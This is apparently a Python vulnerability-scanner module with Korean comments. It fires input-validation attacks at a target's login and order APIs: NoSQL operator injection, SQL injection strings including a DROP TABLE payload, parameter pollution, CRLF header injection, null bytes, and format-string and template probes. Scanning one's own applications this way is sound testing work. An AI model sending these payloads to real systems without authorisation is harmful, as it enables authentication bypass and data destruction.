"""
Input Validation Bypass (입력값 검증 우회)
타입 혼동, 파라미터 오염, 특수문자 우회, 길이 제한 우회
"""
import requests
import json

def scan(target_url):
    result = {
        'name': 'Input Validation Bypass (입력값 우회)',
        'category': 'Input Validation',
        'status': 'SAFE',
        'severity': 'MEDIUM',
        'vulnerabilities': [],
        'recommendation': '서버측 입력 검증 강화, 타입 체크, 길이 제한, 화이트리스트 방식',
        'details': ''
    }
    
    details = []
    
    # 1. 타입 혼동 (Type Juggling)
    details.append("[입력우회-1] 타입 혼동 공격")
    
    login_url = f"{target_url}/api/auth/login"
    
    type_payloads = [
        # Array injection
        ({'employeeId': ['admin'], 'password': ['admin123']}, "Array Injection"),
        ({'employeeId': ['admin', 'user'], 'password': ['pass']}, "Multiple Array"),
        
        # Object injection (NoSQL)
        ({'employeeId': {'$ne': None}, 'password': {'$ne': None}}, "Object $ne"),
        ({'employeeId': {'$gt': ''}, 'password': {'$gt': ''}}, "Object $gt"),
        ({'employeeId': {'$regex': '.*'}, 'password': {'$regex': '.*'}}, "Object $regex"),
        
        # Type confusion
        ({'employeeId': True, 'password': True}, "Boolean True"),
        ({'employeeId': 1, 'password': 1}, "Integer 1"),
        ({'employeeId': 0, 'password': 0}, "Integer 0"),
        ({'employeeId': None, 'password': None}, "Null Type"),
        ({'employeeId': '', 'password': ''}, "Empty String"),
        
        # JSON injection
        ({'employeeId': '{"$ne": null}', 'password': 'test'}, "JSON String"),
    ]
    
    for payload, attack_name in type_payloads:
        try:
            headers = {
                'X-Security-Mode': 'vulnerable',
                'Content-Type': 'application/json'
            }
            resp = requests.post(login_url, json=payload, headers=headers, timeout=5)
            
            # 성공적인 로그인 확인
            if resp.status_code == 200 and ('token' in resp.text.lower() or 'success' in resp.text.lower()):
                result['vulnerabilities'].append(f"타입 혼동 우회: {attack_name}")
                details.append(f"  ✗ {attack_name} 성공")
                result['status'] = 'VULNERABLE'
                
        except Exception as e:
            pass
    
    if result['status'] == 'SAFE':
        details.append("  ✓ 타입 검증 적절")
    
    # 2. HTTP Parameter Pollution (HPP)
    details.append("\n[입력우회-2] 파라미터 오염 (HPP)")
    
    try:
        # URL 파라미터를 여러 번 전송
        hpp_tests = [
            # 동일 파라미터 중복
            "employeeId=wrong&employeeId=admin&password=admin123",
            "employeeId=admin&password=wrong&password=admin123",
            # 배열 형태
            "employeeId[]=wrong&employeeId[]=admin&password=admin123",
        ]
        
        for params_str in hpp_tests:
            try:
                headers = {'X-Security-Mode': 'vulnerable'}
                # GET 파라미터로 전송
                resp = requests.post(
                    f"{login_url}?{params_str}",
                    headers=headers,
                    timeout=5
                )
                
                if resp.status_code == 200 and 'token' in resp.text.lower():
                    result['vulnerabilities'].append("HTTP Parameter Pollution")
                    details.append(f"  ✗ HPP 취약: {params_str[:30]}...")
                    result['status'] = 'VULNERABLE'
                    break
                    
            except:
                pass
                
    except:
        details.append("  • HPP 테스트 실패")
    
    # 3. 특수문자 필터링 우회
    details.append("\n[입력우회-3] 특수문자 우회")
    
    special_char_tests = [
        # SQL Injection 관련
        ("admin' OR '1'='1", "SQL Single Quote"),
        ("admin\" OR \"1\"=\"1", "SQL Double Quote"),
        ("admin` OR `1`=`1", "SQL Backtick"),
        ("admin'; DROP TABLE users--", "SQL Drop"),
        
        # NoSQL Injection
        ("admin'||'1'=='1", "NoSQL OR"),
        
        # Comment injection
        ("admin/**/--", "SQL Comment"),
        ("admin#", "Hash Comment"),
        
        # Unicode bypass
        ("admin\u0027 OR \u00271\u0027=\u00271", "Unicode Quote"),
        
        # Encoding bypass
        ("admin%27%20OR%20%271%27=%271", "URL Encoded"),
    ]
    
    for payload, attack_name in special_char_tests:
        try:
            data = {'employeeId': payload, 'password': 'test'}
            headers = {
                'X-Security-Mode': 'vulnerable',
                'Content-Type': 'application/json'
            }
            
            resp = requests.post(login_url, json=data, headers=headers, timeout=5)
            
            # SQL 에러 또는 성공 확인
            error_indicators = ['sql', 'syntax', 'mysql', 'error', 'exception']
            success_indicators = ['token', 'success', 'authenticated']
            
            if any(ind in resp.text.lower() for ind in error_indicators):
                result['vulnerabilities'].append(f"특수문자 필터링 부재: {attack_name}")
                details.append(f"  ✗ {attack_name} - SQL 에러 노출")
                result['status'] = 'VULNERABLE'
            elif resp.status_code == 200 and any(ind in resp.text.lower() for ind in success_indicators):
                result['vulnerabilities'].append(f"특수문자 우회: {attack_name}")
                details.append(f"  ✗ {attack_name} - 인증 우회")
                result['status'] = 'VULNERABLE'
                
        except:
            pass
    
    # 4. 길이 제한 우회
    details.append("\n[입력우회-4] 길이 제한 우회")
    
    try:
        # 매우 긴 입력
        long_input = 'A' * 10000
        
        data = {
            'employeeId': long_input,
            'password': 'test'
        }
        
        headers = {
            'X-Security-Mode': 'vulnerable',
            'Content-Type': 'application/json'
        }
        
        resp = requests.post(login_url, json=data, headers=headers, timeout=5)
        
        # 버퍼 오버플로우 또는 DoS
        if resp.status_code == 500:
            result['vulnerabilities'].append("긴 입력 처리 오류 (Buffer Overflow 가능)")
            details.append("  ✗ 10000자 입력으로 500 에러")
            result['status'] = 'VULNERABLE'
        elif resp.status_code == 200:
            result['vulnerabilities'].append("입력 길이 제한 없음")
            details.append("  ⚠ 10000자 입력 허용")
            
    except requests.Timeout:
        result['vulnerabilities'].append("긴 입력으로 타임아웃 (DoS)")
        details.append("  ✗ 긴 입력 처리 지연")
        result['status'] = 'VULNERABLE'
    except:
        details.append("  • 길이 제한 테스트 실패")
    
    # 5. Null Byte 삽입
    details.append("\n[입력우회-5] Null Byte 삽입")
    
    try:
        null_byte_tests = [
            'admin\x00',
            'admin%00',
            'admin\x00.jpg',
        ]
        
        for payload in null_byte_tests:
            data = {'employeeId': payload, 'password': 'admin123'}
            headers = {
                'X-Security-Mode': 'vulnerable',
                'Content-Type': 'application/json'
            }
            
            resp = requests.post(login_url, json=data, headers=headers, timeout=5)
            
            if resp.status_code == 200 and 'token' in resp.text.lower():
                result['vulnerabilities'].append("Null Byte 우회")
                details.append(f"  ✗ Null Byte로 검증 우회")
                result['status'] = 'VULNERABLE'
                break
                
    except:
        details.append("  • Null Byte 테스트 실패")
    
    # 6. CRLF Injection
    details.append("\n[입력우회-6] CRLF Injection")
    
    try:
        crlf_payloads = [
            'admin\r\nSet-Cookie: admin=true',
            'admin\r\n\r\n<script>alert(1)</script>',
            'admin%0d%0aSet-Cookie: session=hacked',
        ]
        
        for payload in crlf_payloads:
            data = {'employeeId': payload, 'password': 'test'}
            resp = requests.post(login_url, json=data, timeout=5)
            
            # 응답 헤더에 삽입된 내용 확인
            if 'Set-Cookie' in str(resp.headers) and 'admin=true' in str(resp.headers):
                result['vulnerabilities'].append("CRLF Injection")
                details.append("  ✗ CRLF로 헤더 조작 가능")
                result['status'] = 'VULNERABLE'
                break
                
    except:
        details.append("  • CRLF 테스트 실패")
    
    # 7. 정수 오버플로우
    details.append("\n[입력우회-7] 정수 오버플로우")
    
    try:
        overflow_values = [
            2147483647,  # Max int32
            2147483648,  # Max int32 + 1
            -2147483648,  # Min int32
            9223372036854775807,  # Max int64
        ]
        
        for value in overflow_values:
            data = {'employeeId': str(value), 'password': 'test'}
            resp = requests.post(login_url, json=data, timeout=5)
            
            if resp.status_code == 500:
                result['vulnerabilities'].append(f"정수 오버플로우: {value}")
                details.append(f"  ✗ 정수 오버플로우로 500 에러")
                result['status'] = 'VULNERABLE'
                break
                
    except:
        details.append("  • 정수 오버플로우 테스트 실패")
    
    # 8. 음수 값 입력
    details.append("\n[입력우회-8] 음수 값 우회")
    
    try:
        # 주문 수량에 음수
        order_url = f"{target_url}/api/orders"
        
        negative_tests = [
            {'item_id': 1, 'quantity': -1},
            {'item_id': 1, 'quantity': -999},
            {'item_id': 1, 'price': -100},
        ]
        
        for test_data in negative_tests:
            headers = {'X-Security-Mode': 'vulnerable'}
            resp = requests.post(order_url, json=test_data, headers=headers, timeout=5)
            
            if resp.status_code in [200, 201]:
                result['vulnerabilities'].append(f"음수 값 허용: {test_data}")
                details.append(f"  ✗ 음수 값 검증 부재")
                result['status'] = 'VULNERABLE'
                break
                
    except:
        details.append("  • 음수 값 테스트 불가")
    
    # 9. Format String 공격
    details.append("\n[입력우회-9] Format String")
    
    try:
        format_payloads = [
            '%s%s%s%s%s',
            '%x%x%x%x',
            '%n%n%n%n',
            '${7*7}',  # Expression Language
            '#{7*7}',  # EL alternative
        ]
        
        for payload in format_payloads:
            data = {'employeeId': payload, 'password': 'test'}
            resp = requests.post(login_url, json=data, timeout=5)
            
            # Format string이 실행되었는지 확인
            if '49' in resp.text or 'Illegal format' in resp.text:
                result['vulnerabilities'].append("Format String 취약점")
                details.append(f"  ✗ Format String 처리됨")
                result['status'] = 'VULNERABLE'
                break
                
    except:
        details.append("  • Format String 테스트 실패")
    
    result['details'] = '\n'.join(details)
    return result